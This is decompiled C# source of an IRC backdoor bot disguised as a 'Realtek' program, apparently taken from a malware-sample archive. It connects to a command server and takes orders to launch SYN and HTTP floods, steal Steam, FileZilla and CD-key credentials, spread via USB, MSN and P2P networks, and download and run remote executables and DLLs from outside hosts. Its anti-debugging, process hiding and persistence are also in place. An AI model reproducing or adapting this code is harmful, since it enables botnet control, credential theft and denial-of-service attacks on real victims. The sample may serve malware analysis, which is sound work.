// Decompiled with JetBrains decompiler
// Type: Realtek.Program
// Assembly: Realtek, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D76B5F46-2334-4413-9FB7-17692F948558
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Backdoor.MSIL.IrcBot.u-ef0b787b17c95db8b20bb6d9cfcd867d72ab60807c74c3ee2df2c4e0e509958f.exe

using System;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text.RegularExpressions;
using System.Threading;

namespace Realtek
{
  internal class Program
  {
    private const string User = "User kkk kkk kkk kkk :kkk";
    internal const string Server = "mobipornhub.net";
    private const string Pass = "";
    private const string Authhost = "admin.gay";
    private static readonly string CountryName = "[" + CultureInfo.InstalledUICulture.ThreeLetterISOLanguageName.ToUpper() + "]";
    private static readonly Random R = new Random();
    private static readonly int RanDnick = Program.R.Next(100000);
    private static readonly string Rand1 = Program.R.Next(100000).ToString() + "update.exe";
    private static readonly string Pseudo = "[V2]" + Program.CountryName + "[" + Environment.MachineName + "]" + (object) Program.RanDnick;
    private static readonly int Hole = Convert.ToInt32("65500");
    internal static StreamWriter Writer;
    public static string Channel = "#msn#";
    public static string MessageGreen = "PRIVMSG " + Program.Channel + " : \u00039 ";
    public static string MessageRed = "PRIVMSG " + Program.Channel + " : \u00035 ";

    public static void Main()
    {
      Antis.CheckDebug();
      Hide.HideProc();
      Install.Drop();
      Reg.WatchThread();
      if (new InstanceUnique("{newfuckingmutex6969}").IsRunning())
        Environment.Exit(0);
      Usb.Listen();
      Program.Run();
    }

    public static void Registar_Dlls(string filePath)
    {
      try
      {
        string str = "/s \"" + filePath + "\"";
        Process process = new Process();
        process.StartInfo.FileName = "regsvr32.exe";
        process.StartInfo.Arguments = str;
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.CreateNoWindow = true;
        process.StartInfo.RedirectStandardOutput = true;
        process.Start();
        process.WaitForExit();
        process.Close();
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.ToString());
        Console.ReadLine();
      }
    }

    internal static void Run()
    {
      try
      {
        WebClient webClient = new WebClient();
        NetworkStream stream = new TcpClient("mobipornhub.net", Program.Hole).GetStream();
        StreamReader streamReader = new StreamReader((Stream) stream);
        Program.Writer = new StreamWriter((Stream) stream)
        {
          AutoFlush = true
        };
        new PingSender().Start();
        Program.Writer.WriteLine("PASS ");
        Program.Writer.WriteLine("User kkk kkk kkk kkk :kkk");
        Program.Writer.WriteLine("NICK " + Program.Pseudo);
        Program.Writer.WriteLine("JOIN " + Program.Channel);
        Program.Writer.WriteLine("JOIN ##" + Program.CountryName);
label_83:
        string input;
        while ((input = streamReader.ReadLine()) != null)
        {
          if (input.Contains("PING :"))
          {
            int startIndex = input.IndexOf("PING :");
            string str = input.Substring(startIndex).Replace("PING :", string.Empty);
            Program.Writer.WriteLine("PONG :" + str);
          }
          Program.Writer.WriteLine("JOIN " + Program.Channel);
          Program.Writer.WriteLine("JOIN ##" + Program.CountryName);
          if (input.Contains("admin.gay"))
          {
            if (input.Contains("!syn"))
            {
              try
              {
                MatchCollection matchCollection = new Regex("!syn (?<host>\\S+) (?<port>\\d+) (?<threads>\\d+) (?<sockets>\\d+)").Matches(input);
                for (int i = 0; i != matchCollection.Count; ++i)
                {
                  string str = matchCollection[i].Groups["host"].Value;
                  int int32_1 = Convert.ToInt32(matchCollection[i].Groups["port"].Value);
                  int int32_2 = Convert.ToInt32(matchCollection[i].Groups["threads"].Value);
                  int int32_3 = Convert.ToInt32(matchCollection[i].Groups["sockets"].Value);
                  if (str != null & int32_1 != 0)
                  {
                    if (Syn.IsEnabled)
                      Syn.StopSuperSyn();
                    if (HttpFlood.IsEnabled)
                      HttpFlood.StopHttpFlood();
                    Syn.Host = str;
                    Syn.Port = int32_1;
                    Syn.SuperSynSockets = int32_2;
                    Syn.Threads = int32_3;
                    Syn.StartSuperSyn();
                    Program.Writer.WriteLine(Program.MessageGreen + "SuperSyn started on " + str + " Port " + (object) int32_1 + " with " + (object) int32_2 + " threads and " + (object) int32_3 + " sockets");
                    Thread.Sleep(2000);
                  }
                }
              }
              catch (Exception ex)
              {
                Program.Writer.WriteLine(Program.MessageRed + "error : " + (object) ex);
                Thread.Sleep(2000);
              }
            }
            if (input.Contains("!stopsyn"))
            {
              try
              {
                if (Syn.IsEnabled)
                  Syn.StopSuperSyn();
                Program.Writer.WriteLine(Program.MessageGreen + "SuperSyn stopped");
                Thread.Sleep(2000);
              }
              catch
              {
              }
            }
            if (input.Contains("!steam"))
            {
              try
              {
                Steam.Start();
                Thread.Sleep(2000);
              }
              catch
              {
              }
            }
            if (input.Contains("!msn"))
            {
              try
              {
                new WebClient().DownloadFile("http://www.share-finder.com/tachatte/MSNMessengerAPI.dll", Environment.CurrentDirectory + "\\MSNMessengerAPI.dll");
              }
              catch
              {
              }
              try
              {
                Program.Registar_Dlls(Environment.CurrentDirectory + "\\MSNMessengerAPI.dll");
              }
              catch
              {
              }
              try
              {
                int startIndex = input.IndexOf("!msn");
                Msnspread.MsnSend(input.Substring(startIndex).Replace("!msn ", string.Empty));
                Thread.Sleep(2000);
              }
              catch
              {
              }
            }
            if (input.Contains("!p2p"))
            {
              try
              {
                P2P.ShareazaStart();
                P2P.EmuleStart();
                Thread.Sleep(2000);
              }
              catch
              {
              }
            }
            if (input.EndsWith("!dl"))
            {
              try
              {
                int startIndex = input.IndexOf("http://");
                string str = input.Substring(startIndex);
                webClient.DownloadFile(str.Replace(" !dl", string.Empty), Path.GetTempPath() + Program.Rand1);
                Process.Start(new ProcessStartInfo()
                {
                  FileName = Program.Rand1,
                  WorkingDirectory = Path.GetTempPath()
                });
                Program.Writer.WriteLine(Program.MessageGreen + "downloaded and executed in : " + Path.GetTempPath() + Program.Rand1);
                Thread.Sleep(2000);
              }
              catch
              {
              }
            }
            if (input.Contains("!uninstall"))
              Uninstall.Byebye();
            if (input.Contains("!die"))
              Environment.Exit(0);
            if (input.Contains("!infos"))
            {
              try
              {
                CompInfos.Getinfos();
                Thread.Sleep(2000);
              }
              catch
              {
              }
            }
            if (input.Contains("!visit"))
            {
              try
              {
                int startIndex = input.IndexOf("http://");
                string str = input.Substring(startIndex);
                Process.Start(str.Replace(" !visit", string.Empty));
                Program.Writer.WriteLine(Program.MessageGreen + str.Replace(" !visit", string.Empty) + " visited");
                Thread.Sleep(2000);
              }
              catch
              {
              }
            }
            if (input.EndsWith("!fz"))
            {
              try
              {
                Fz.Getfz();
                Thread.Sleep(2000);
              }
              catch
              {
              }
            }
            if (input.EndsWith("!cdkeyz"))
            {
              try
              {
                Cdkeyz.Start();
                Thread.Sleep(2000);
              }
              catch
              {
              }
            }
            if (input.Contains("!httpflood"))
            {
              try
              {
                MatchCollection matchCollection = new Regex("!httpflood (?<host>\\S+) (?<interval>\\d+) (?<threads>\\d+)").Matches(input);
                for (int i = 0; i != matchCollection.Count; ++i)
                {
                  string str = matchCollection[i].Groups["host"].Value;
                  int int32_4 = Convert.ToInt32(matchCollection[i].Groups["interval"].Value);
                  int int32_5 = Convert.ToInt32(matchCollection[i].Groups["threads"].Value);
                  if (HttpFlood.IsEnabled)
                    HttpFlood.StopHttpFlood();
                  if (Syn.IsEnabled)
                    Syn.StopSuperSyn();
                  HttpFlood.Host = str;
                  HttpFlood.Interval = int32_4;
                  HttpFlood.Threads = int32_5;
                  HttpFlood.StartHttpFlood();
                }
              }
              catch (Exception ex)
              {
                Program.Writer.WriteLine(Program.MessageRed + (object) ex);
                Thread.Sleep(5000);
              }
            }
            if (input.EndsWith("!httpfloodstop"))
            {
              try
              {
                if (HttpFlood.IsEnabled)
                  HttpFlood.StopHttpFlood();
              }
              catch
              {
              }
            }
          }
        }
        goto label_83;
      }
      catch
      {
        Program.Run();
      }
    }
  }
}
